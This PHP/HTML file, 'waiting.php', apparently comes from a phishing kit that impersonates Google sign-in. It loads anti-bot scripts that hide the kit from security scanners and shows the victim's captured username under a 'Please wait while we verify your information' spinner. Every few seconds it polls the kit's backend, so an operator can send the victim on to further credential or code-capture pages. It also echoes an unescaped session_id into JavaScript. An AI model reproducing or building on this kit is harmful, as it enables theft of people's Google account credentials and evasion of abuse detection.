<?php
error_reporting(0);
include('/../Antibot/Bot-Crawler.php');
include('/../Antibot/Dila_DZ.php');
include('/../Antibot/blockers.php');
include('/../Antibot/detects.php');

// pages/waiting.php
require_once __DIR__ . '/../includes/functions.php';
checkBlockedIP();  // Block access if IP is blocked
require_once __DIR__ . '/../includes/functions.php';

$sessionId = $_GET['session_id'] ?? null;
if (!$sessionId) {
    header('Location: ../index.php');
    exit;
}

$sess = getSession($sessionId);
if (!$sess) {
    header('Location: ../index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing - Google</title>
    <link rel="stylesheet" href="res/css/style.css">
    <style>
        :root {
            --bg-0: #0b0f17;
            --bg-1: #111726;
            --bg-2: #1a2233;
            --card: rgba(22, 28, 42, 0.85);
            --border: rgba(120, 140, 180, 0.14);
            --border-strong: rgba(120, 140, 180, 0.28);
            --text-1: #e8edf7;
            --text-2: #9aa7bd;
            --text-3: #6b7689;
            --accent-1: #4f8cff;
            --accent-2: #8b5cf6;
            --accent-glow: rgba(79, 140, 255, 0.35);
            --radius-lg: 22px;
            --radius-md: 12px;
            --radius-sm: 8px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Inter", "Google Sans", Roboto, -apple-system, Arial, sans-serif;
        }

        html, body {
            min-height: 100%;
        }

        body {
            background: var(--bg-0);
            color: var(--text-1);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
            position: relative;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        /* Ambient background glow */
        body::before,
        body::after {
            content: "";
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            opacity: 0.55;
            pointer-events: none;
            z-index: 0;
        }

        body::before {
            width: 520px;
            height: 520px;
            background: radial-gradient(circle, var(--accent-1), transparent 70%);
            top: -180px;
            left: -160px;
        }

        body::after {
            width: 520px;
            height: 520px;
            background: radial-gradient(circle, var(--accent-2), transparent 70%);
            bottom: -200px;
            right: -160px;
        }

        .container {
            width: 100%;
            max-width: 980px;
            position: relative;
            z-index: 1;
        }

        .signin-card {
            background: var(--card);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border: 1px solid var(--border);
            border-radius: var(--radius-lg);
            padding: 40px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 48px;
            position: relative;
            overflow: hidden;
            box-shadow:
                0 30px 80px rgba(0, 0, 0, 0.55),
                0 0 0 1px rgba(255, 255, 255, 0.02) inset;
        }

        /* Top accent line */
        .signin-card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent-1), var(--accent-2), transparent);
            opacity: 0.8;
            z-index: 3;
        }

        /* Progress bar — replaces the old blue sweep, same animation behavior */
        .signin-card::after {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, var(--accent-1), var(--accent-2), transparent);
            animation: loading 1.2s ease-in-out infinite;
            z-index: 4;
        }

        @keyframes loading {
            0%   { left: -100%; }
            100% { left: 100%; }
        }

        .signin-left {
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 8px;
        }

        .signin-right {
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-top: 8px;
        }

        .logo-container {
            margin-bottom: 28px;
        }

        .google-logo {
            width: 44px;
            height: 44px;
            display: block;
            filter: drop-shadow(0 4px 14px var(--accent-glow));
        }

        h1 {
            color: var(--text-1);
            font-size: 34px;
            font-weight: 600;
            letter-spacing: -0.02em;
            line-height: 1.2;
            margin-bottom: 12px;
        }

        .subtitle {
            color: var(--text-2);
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        .user-email {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 8px 14px;
            border: 1px solid var(--border-strong);
            border-radius: 999px;
            background: rgba(255, 255, 255, 0.03);
            color: var(--text-1);
            font-size: 14px;
            transition: border-color 0.2s ease, background 0.2s ease;
        }

        .user-email:hover {
            border-color: var(--accent-1);
            background: rgba(79, 140, 255, 0.08);
        }

        .user-icon,
        .dropdown-icon {
            opacity: 0.75;
            flex-shrink: 0;
        }

        /* Loading content */
        .loading-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 48px 24px;
        }

        .loading-spinner {
            width: 28px;
            height: 28px;
            border: 3px solid rgba(120, 140, 180, 0.25);
            border-radius: 50%;
            border-top-color: var(--accent-1);
            border-right-color: var(--accent-2);
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
            box-shadow: 0 0 20px var(--accent-glow);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            color: var(--text-1);
            font-size: 16px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }

        .loading-text::after {
            content: "";
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--accent-1);
            margin-left: 6px;
            animation: pulse 1.4s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50%      { opacity: 1;   transform: scale(1.2); }
        }

        .loading-subtext {
            color: var(--text-3);
            font-size: 14px;
            text-align: center;
        }

        /* Footer */
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 22px 8px 0;
            color: var(--text-3);
            font-size: 12px;
        }

        .language-select {
            color: var(--text-2);
            font-size: 12px;
            border: 1px solid transparent;
            border-radius: var(--radius-sm);
            background: transparent;
            padding: 6px 8px;
            cursor: pointer;
            outline: none;
            transition: all 0.18s ease;
        }

        .language-select:hover,
        .language-select:focus {
            color: var(--text-1);
            border-color: var(--border-strong);
            background: rgba(255,255,255,0.03);
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: var(--text-3);
            font-size: 12px;
            text-decoration: none;
            letter-spacing: 0.02em;
            transition: color 0.18s ease;
        }

        .footer-links a:hover {
            color: var(--text-1);
        }

        @media (max-width: 860px) {
            .signin-card {
                grid-template-columns: 1fr;
                gap: 32px;
                padding: 32px 28px;
            }

            .signin-right {
                padding-top: 0;
            }

            h1 {
                font-size: 28px;
            }

            .subtitle {
                margin-bottom: 20px;
            }
        }

        @media (max-width: 520px) {
            body {
                padding: 0;
                align-items: flex-start;
            }

            .signin-card {
                border-radius: 0;
                border-left: none;
                border-right: none;
                padding: 28px 20px;
                min-height: 100vh;
            }

            .footer {
                flex-direction: column;
                gap: 14px;
                padding: 22px 0 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="44" height="44" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Processing</h1>
                <p class="subtitle">Please wait while we verify your information</p>
                <div class="user-email">
                    <svg aria-hidden="true" class="user-icon" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM12 5c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                    <span><?php echo htmlspecialchars($sess['username']); ?></span>
                    <svg aria-hidden="true" class="dropdown-icon" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M7 10l5 5 5-5z"></path>
                    </svg>
                </div>
            </div>
            
            <div class="signin-right">
                <div class="loading-content">
                    <div class="loading-spinner"></div>
                    <p class="loading-text">Processing your request</p>
                    <p class="loading-subtext">This may take a few moments</p>
                </div>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
	
<script>
  setInterval(function(){
    fetch('../update_online.php?session_id=<?php echo $sessionId; ?>');
  }, 3000);
  
const sessionId = "<?php echo $sessionId; ?>";
setInterval(function(){
    fetch('../poll_status.php?session_id=' + sessionId)
    .then(r => r.json())
    .then(data => {
        if (data.status && data.status !== 'waiting') {
            window.location.href = data.status + '.php?session_id=' + sessionId;
        }
    });
}, 2000);
</script>
</body>
</html>
